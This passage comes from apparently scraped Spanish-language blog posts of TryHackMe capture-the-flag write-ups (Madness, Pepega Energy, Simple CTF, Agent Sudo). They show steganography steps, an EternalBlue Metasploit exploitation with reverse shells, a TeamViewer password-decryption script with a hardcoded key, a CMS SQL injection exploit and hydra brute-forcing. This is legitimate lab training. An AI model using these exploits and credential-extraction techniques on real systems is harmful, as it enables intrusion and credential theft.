obtener la imagen en hexadecimal, luego de eso con vim editamos el archivo\nFF D8 FF E0 00 10 4A 46 49 46 00 01 1 2 root@aoiri:~/tryhackme/madness# xxd -p thm.jpg \u0026gt; hexthm root@aoiri:~/tryhackme/madness# vim hexthm Remplazamos exactamente la misma cantidad de valores en hex de JPG.\nAntes:\n89504e470d0a1a0a000000010100000100010000ffdb0043000302020302 Despues:\nFFD8FFE000104A46494600010100000100010000ffdb0043000302020302 Utilizamos CyberChef para renderizar nuestra imagen:\nLa imagen nos muestra una direccion, al visitarla en la pagina encontramos lo siguiente:\nEl codigo fuente nos muestra un comentario:\nUtilizamos GOBUSTER para buscar archivos o directorios en el directorio:\n1 2 root@aoiri:~/tryhackme/madness# gobuster dir -u http://10.10.53.61/th1s_1s_h1dd3n/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /index.php (Status: 200) A la pagina index le pasamos al parametro secret un numero, al hacer esto se muestra el numero:\nBURPSUITE Utilizamos burpsuite para poder obtener el numero correcto que se encuentra entre 0-99 como lo menciona el comentario que encontramos en la pagina.\nEncontramos con el numero 7+ un mensaje distinto.\nSTEGO Con la imagen que modificamos, utilizamos steghide y con la frase que nos muestra la pagina. Nos muestra el usuario e indica que ya tenemos la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 root@aoiri:~/tryhackme/madness# steghide extract -sf imagen.jpg Enter passphrase: wrote extracted data to \u0026#34;hidden.txt\u0026#34;. root@aoiri:~/tryhackme/madness# cat hidden.txt Fine you found the password! Here\u0026#39;s a username wbxre I didn\u0026#39;t say I would make it easy for you! root@aoiri:~/tryhackme/madness# Intentamos utilizar las credenciales en el servicio SSH pero no funcionó, por lo que utilizamos nuevamente cyberchef para poder \u0026ldquo;decodificar\u0026rdquo; el usuario.\njoker\nUtilizamos steghide para extraer los datos de la imagen de portada de la maquina (no requiere contraseña):\n1 2 3 4 5 6 7 8 9 root@aoiri:~/tryhackme/madness# steghide extract -sf 5iW7kC8.jpg Enter passphrase: wrote extracted data to \u0026#34;password.txt\u0026#34;. root@aoiri:~/tryhackme/madness# password.txt I didn\u0026#39;t think you\u0026#39;d find me! Congratulations! Here take my password *ax[... snip ...]P SSH - USER Utilizamos las credenciales que encontramos en el servicio SSH, obtenemos nuestra shell y nuestra flat user.txt.\nPRIVILEGE ESCALATION Buscamos por archivos SUID en la maquina, encontramos screen-4.5.0, al realizar la busqueda en exploitdb encontramos un exploit que puede ayudarnos a escalar privilegios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 joker@ubuntu:~$ find / -perm -g=s -o -perm -u=s -type f 2\u0026gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/bin/mlocate /usr/bin/chage /usr/bin/crontab /usr/bin/ssh-agent /usr/bin/wall /usr/bin/vmware-user-suid-wrapper /usr/bin/gpasswd /usr/bin/passwd /usr/bin/newgrp /usr/bin/expiry /usr/bin/chsh /usr/bin/bsd-write /usr/bin/chfn /usr/bin/sudo /usr/local/share/emacs /usr/local/share/emacs/site-lisp /usr/local/share/xml /usr/local/share/xml/schema /usr/local/share/xml/misc /usr/local/share/xml/declaration /usr/local/share/xml/entities /usr/local/share/sgml /usr/local/share/sgml/misc /usr/local/share/sgml/declaration /usr/local/share/sgml/stylesheet /usr/local/share/sgml/entities /usr/local/share/sgml/dtd /usr/local/share/fonts /usr/local/lib/python3.5 /usr/local/lib/python3.5/dist-packages /bin/fusermount /bin/su /bin/ping6 /bin/screen-4.5.0 /bin/screen-4.5.0.old /bin/mount /bin/ping /bin/umount /sbin/unix_chkpwd /sbin/pam_extrausers_chkpwd /var/cache/man /var/mail /var/local /run/log/journal /run/log/journal/2e1e8ccd62e8ef3b80d3aeab5e10fee0 joker@ubuntu:~$ screen-4.5.0\nEjecutamos el exploit en la maquina, obtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"Madness es una maquina de TryHackMe que presenta distintos retos tras enumerar el sitio web y obtener credenciales para ingresar por SSH. Escalamos privilegios con una vulnerabilidad en screen.","id":167,"section":"posts","tags":["xxd","steganography","steghide","suid"],"title":"TryHackMe - Madness","uri":"https://sckull.github.io/posts/madness_thm/"},{"content":"\rPepega Energy es una maquina de TryHackMe, explotamos MS17-010 con un exploit de Metasploit para luego obtener las credenciales de TeamViewer con un modulo de postexplotacion y un script de Python.\nRoom Titulo Pepega Energy Descripción A new startup has asked for a security audit: turns out there\u0026rsquo;s only one laptop. Puntos * Dificultad Media Maker SherlockSec NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.219.23 Nmap scan report for 10.10.219.23 Host is up (0.15s latency). Not shown: 65522 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-02-12T00:24:28+00:00; 0s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 5938/tcp open teamviewer? 9001/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Host: PEPEGAENERGY-01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_nbstat: NetBIOS name: PEPEGAENERGY-01, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:a3:b7:7e:bc:1e (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: PepegaEnergy-01 | NetBIOS computer name: PEPEGAENERGY-01\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-02-12T00:24:21+00:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-02-12T00:24:21 |_ start_date: 2020-02-12T00:02:09 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 11 18:25:30 2020 -- 1 IP address (1 host up) scanned in 1375.40 seconds Utilizamos nuevamente NMAP para escanear el puerto de smb (445) por posibles vulnerabilidades, vemos que es vulnerable a ms17-010.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.80 scan initiated Tue Feb 11 18:27:13 2020 as: nmap --script smb-vuln* -p 445 -o nmap_smb_vuln 10.10.219.23 Nmap scan report for 10.10.219.23 Host is up (0.25s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 # Nmap done at Tue Feb 11 18:27:26 2020 -- 1 IP address (1 host up) scanned in 12.34 seconds METASPLOIT Utilizamos metasploit para poder explotar la vulnerabilidad, primero utilizamos el modulo auxiliar para verificar que la maquina era vulnerable.\n1 2 3 4 5 6 7 8 msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; set rhosts 10.10.219.23 rhosts =\u0026gt; 10.10.219.23 msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; run [+] 10.10.219.23:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.219.23:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; Una vez verificado, utilizamos el exploit en contra de la maquina, obteniendo una shell con usuario nt authority\\system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhosts 10.10.219.23 rhosts =\u0026gt; 10.10.219.23 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.1.72:4444 [*] 10.10.219.23:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.219.23:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.219.23:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.219.23:445 - Connecting to target for exploitation. [+] 10.10.219.23:445 - Connection established for exploitation. [+] 10.10.219.23:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.219.23:445 - CORE raw buffer dump (42 bytes) [*] 10.10.219.23:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.219.23:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.219.23:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.219.23:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.219.23:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.219.23:445 - Sending all but last fragment of exploit packet [*] 10.10.219.23:445 - Starting non-paged pool grooming [+] 10.10.219.23:445 - Sending SMBv2 buffers [+] 10.10.219.23:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.219.23:445 - Sending final SMBv2 buffers. [*] 10.10.219.23:445 - Sending last fragment of exploit packet! [*] 10.10.219.23:445 - Receiving response from exploit packet [+] 10.10.219.23:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.219.23:445 - Sending egg to corrupted connection. [*] 10.10.219.23:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.1.72:4444 -\u0026gt; 10.10.219.23:49189) at 2020-02-11 18:35:42 -0600 [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt; Nuestra shell no era meterpreter por lo que utilizamos el modulo de post-explotacion shell_to_meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.8.1.72 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set session 2 session =\u0026gt; 2 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 2 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.1.72:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.219.23:49193 (10.10.219.23) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (180291 bytes) to 10.10.219.23 [*] Meterpreter session 3 opened (10.8.1.72:4433 -\u0026gt; 10.10.219.23:49194) at 2020-02-11 18:48:44 -0600 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.219.23:49193 (10.10.219.23) 3 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ PEPEGAENERGY-01 10.8.1.72:4433 -\u0026gt; 10.10.219.23:49194 (10.10.219.23) TeamViewer - CVE-2019-18988 Dentro de los procesos que se estan ejecutando en la maquina hay un proceso curioso y es TeamViewer. Buscamos vulnerabilidades recientes y vemos el CVE-2019-18988 en el cual indica que pueden ser extraidos datos utilizando querys en claves de registro, en nuestro caso, utilizamos post/windows/gather/credentials/teamviewer_passwords de metasploit y logramos obtener la contraseña.\nTeamViewer - CVE-2019-18988\nPost\nPor alguna razon nuestra contraseña no se muestra completa con el modulo de metasploit, se puede hacer manualmente, haciendo un query al registro:\n1 2 3 4 5 6 7 8 C:\\Users\\Timmy\\Desktop\u0026gt;reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 /v SecurityPasswordAES reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 /v SecurityPasswordAES HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 SecurityPasswordAES REG_BINARY 871C158E545657D6D714B[... snip ...]594917DD1847A810EFF8C13356 C:\\Users\\Timmy\\Desktop\u0026gt; Luego con un script en python poder desencriptar la conraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import sys, hexdump, binascii from Crypto.Cipher import AES class AESCipher: def __init__(self, key): self.key = key def decrypt(self, iv, data): self.cipher = AES.new(self.key, AES.MODE_CBC, iv) return self.cipher.decrypt(data) key = binascii.unhexlify(\u0026#34;0602000000a400005253413100040000\u0026#34;) iv = binascii.unhexlify(\u0026#34;0100010067244F436E6762F25EA8D704\u0026#34;) hex_str_cipher = \u0026#34;871C158E545657D6D714B34730465D85E4A[... snip ...]FC41AA4A18ADFE594917DD1847A810EFF8C13356\u0026#34; #Query ciphertext = binascii.unhexlify(hex_str_cipher) raw_un = AESCipher(key).decrypt(iv, ciphertext) print(hexdump.hexdump(raw_un)) password = raw_un.decode(\u0026#39;utf-16\u0026#39;) print(password) Contraseña:\n1 2 3 4 5 6 7 root@aoiri:~/tryhackme/pepegaenergy# python aes_teamviewer.py 00000000: 52 00 65 00 64 00 42 00 75 00 6C 00 6C 00 45 00 R.e.d.....l.l.E. 00000010: 6E 00 65 00 72 00 67 00 79 00 42 00 61 00 64 00 [... snip ...] 00000020: 58 00 44 00 00 00 00 00 00 00 00 00 00 00 00 00 X............... None Re[... snip ...]D root@aoiri:~/tryhackme/pepegaenergy# FLAGS En la carpeta de Timmy y Zachary vemos algunos archivos con extencion rtf, los cuales podemos abrir utilizando Writer de LibreOffice y obtener la informacion que necesitamos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 meterpreter \u0026gt; ls Listing: C:\\Users\\Timmy\\Desktop =============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1155 fil 2020-02-04 17:15:48 -0600 RuneLite.lnk 100666/rw-rw-rw- 282 fil 2020-02-04 13:56:30 -0600 desktop.ini 100666/rw-rw-rw- 42337 fil 2020-02-04 17:14:03 -0600 home work.rtf 100666/rw-rw-rw- 43806 fil 2020-02-04 17:14:03 -0600 important.rtf 100666/rw-rw-rw- 41978 fil 2020-02-04 17:14:03 -0600 rune scape pass word.rtf 100777/rwxrwxrwx 41 fil 2020-02-04 13:59:32 -0600 script.bat meterpreter \u0026gt; dir Listing: C:\\Users\\Zachary\\Desktop\\Work Documents ================================================ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 42457 fil 2020-02-04 17:12:36 -0600 Email Backup - Mockup.rtf 100666/rw-rw-rw- 12234768 fil 2020-02-04 17:12:36 -0600 Mockup 1.png 100666/rw-rw-rw- 11780324 fil 2020-02-04 17:12:36 -0600 Mockup 2.png 100666/rw-rw-rw- 680 fil 2020-02-04 15:44:41 -0600 To-Do List.rtf RDP - Desktop Utilizamos el servicio RDP de la maquina para obtener las flags dentro de Firefox del usuario Zachary y Timmy, para iniciar sesion en este servicio utilizamos al usuario Zachary y la contraseña que encontramos en TeamViewer:\nZachary\nTimmy\n","description":"Pepega Energy es una maquina de TryHackMe, explotamos MS17-010 con un exploit de Metasploit para luego obtener las credenciales de TeamViewer con un modulo de postexplotacion y un script de Python.","id":168,"section":"posts","tags":["metasploit","TeamViewer","rdp"],"title":"TryHackMe - Pepega Energy","uri":"https://sckull.github.io/posts/pepegaenergy/"},{"content":"\rSimple CTF es una maquina de TryHackMe, en CMS Made Simple enocntramos credenciales las cuales nos dieron acceso por SSH. Con Vim e informacion de GTFOBins obtuvimos acceso privilegiado.\nRoom Titulo Simple CTF Descripción Beginner level ctf Puntos 300 Dificultad Facil Maker MrSeth6797 NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (2222) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 # Nmap 7.80 scan initiated Wed Feb 5 00:40:46 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.105 Nmap scan report for 10.10.235.105 Host is up (0.17s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.1.72 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA) | 256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA) |_ 256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 5 00:46:01 2020 -- 1 IP address (1 host up) scanned in 314.63 seconds FTP Accedemos al servicio ftp mediante el \u0026lsquo;usuario\u0026rsquo; anonymous y encontramos una nota en la que nos muestra un mensaje que indica que la contraseña es la misma que el usuario y la contraseña puede ser crackeada en segundos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 root@aoiri:~/tryhackme/simplectf# ftp 10.10.235.105 Connected to 10.10.235.105. 220 (vsFTPd 3.0.3) Name (10.10.235.105:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Aug 17 18:24 pub 226 Directory send OK. ftp\u0026gt; cd pub 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 166 Aug 17 18:24 ForMitch.txt 226 Directory send OK. ftp\u0026gt; get ForMitch.txt local: ForMitch.txt remote: ForMitch.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ForMitch.txt (166 bytes). 226 Transfer complete. 166 bytes received in 0.00 secs (953.5845 kB/s) ftp\u0026gt; exit 221 Goodbye. root@aoiri:~/tryhackme/simplectf# cat ForMitch.txt Dammit man... you\u0026#39;te the worst dev i\u0026#39;ve seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess! root@aoiri:~/tryhackme/simplectf# HTTP Encontramos la pagina principal de Apache en el puerto http (80).\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4 5 6 7 root@aoiri:~/tryhackme/simplectf# gobuster dir -u 10.10.235.105 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -x php,html,txt -q /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /simple (Status: 301) /simple Encontramos un CMS corriendo en la maquina especificamente CMS Made Simple, vemos la version que esta corriendo en el footer de la pagina.\nCMS Made Simple - CVE-2019-9053 Encontramos una vulnerabilidad de Inyeccion SQL que afecta a este CMS, utilizamos el exploit para obtener el usuario y contraseña.\nCMS Made Simple \u0026lt; 2.2.10 - SQL Injection\n1 2 3 4 5 6 7 python CVE-2019-9053.py -u http://10.10.2.28/simple/ --crack -w 10k-most-common.txt [+] Salt for password found: 1dac0d9***fa6bb2 [+] Username found: mitch [+] Email found: admin@admin.com [+] Password found: 0c01f4468b*****a84c7eb73846e8d96 [+] Password cracked: ****** Intentamos utilizar las credenciales que encontramos en el panel de Made Simple pero no logramos iniciar sesion.\nSSH - User Utilizamos las credenciales que encontramos en el servicio SSH para poder obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion sencilla con sudo -l -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos a /usr/bin/vim, para obtener una shell utilizamos GTFOBINS.\nObtenemos nuestra shell con usuario root y nuestra flag root.txt.\n","description":"Simple CTF es una maquina de TryHackMe, en CMS Made Simple enocntramos credenciales las cuales nos dieron acceso por SSH. Con Vim e informacion de GTFOBins obtuvimos acceso privilegiado.","id":169,"section":"posts","tags":["ftp","CMS Made Simple","vim"],"title":"TryHackMe - Simple CTF","uri":"https://sckull.github.io/posts/simplectfthm/"},{"content":"\rAgent Sudo es una maquina de TryHackMe, utilizamos burpsuite para encontrar el nombre de uno de los agentes seguidamente de un usuario, hydra para obtener acceso al servicio FTP, finalmente un reto de esteganografia para obtener las credenciales de acceso a la maquina. Mediante una vulnerabilidad en Sudo obtuvimos acceso root.\nRoom Titulo Agent Sudo Descripción You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. Puntos 840 Dificultad Facil Maker DesKel NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.80 scan initiated Tue Feb 4 21:35:26 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.45 Nmap scan report for 10.10.235.45 Host is up (0.20s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 4 21:43:52 2020 -- 1 IP address (1 host up) scanned in 506.11 seconds HTTP WHATWEB Esca corriendo una pagina sobre apache 2.4.29.\n1 2 3 root@aoiri:~/tryhackme/agentsudo# whatweb http://10.10.235.45 http://10.10.235.45 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.235.45], Title[Annoucement] root@aoiri:~/tryhackme/agentsudo# GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4 root@aoiri:~/tryhackme/agentsudo# gobuster dir -u 10.10.235.45 -w /usr/share/wordlists/dirb/common_nofirst10.txt -x php,html,txt -t 15 -q /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403) HTTP Web Al visitar la pagina encontramos un mensaje, en el cual nos mencionan el user-agent y que debemos de utilizar nuestro nombre en codigo para acceder.\nUtilizamos \u0026lsquo;R\u0026rsquo; en User-Agent y nos muestra un mensaje distinto.\nUtilizamos BURPSUITE para poder realizar distintas peticiones con el \u0026lsquo;User-Agent\u0026rsquo; utilizando como payloads:\n1 2 3 \u0026gt;\u0026gt;\u0026gt; import string \u0026gt;\u0026gt;\u0026gt; print string.printable 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ Encontramos que existe el Agente C, el contenido solo puede ser visto en nuestro navegador ya que nos redirige hacia otra pagina.\nAgente C:\nNos muestra un mensaje que muestra el nombre del agente \u0026lsquo;chris\u0026rsquo;.\nFTP Para poder acceder al servicio de FTP utilizamos hydra para realizar fuerza bruta a la contraseña con el usuario chris.\n1 2 3 4 5 6 7 8 9 10 root@aoiri:~/tryhackme/agentsudo# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.235.45 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-04 22:13:47 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ftp://10.10.235.45:21/ [STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active [21][ftp] host: 10.10.235.45 login: chris password: ******* 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-04 22:14:56 Al acceder nos encontramos con varios archivos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 root@aoiri:~/tryhackme/agentsudo# ftp 10.10.235.45 Connected to 10.10.235.45. 220 (vsFTPd 3.0.3) Name (10.10.235.45:root): chris 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 12:15 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 12:22 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 12:33 cutie.webp 226 Directory send OK. ftp\u0026gt; mget * mget To_agentJ.txt? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes). 226 Transfer complete. 217 bytes received in 0.00 secs (1.3526 MB/s) mget cute-alien.jpg? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data 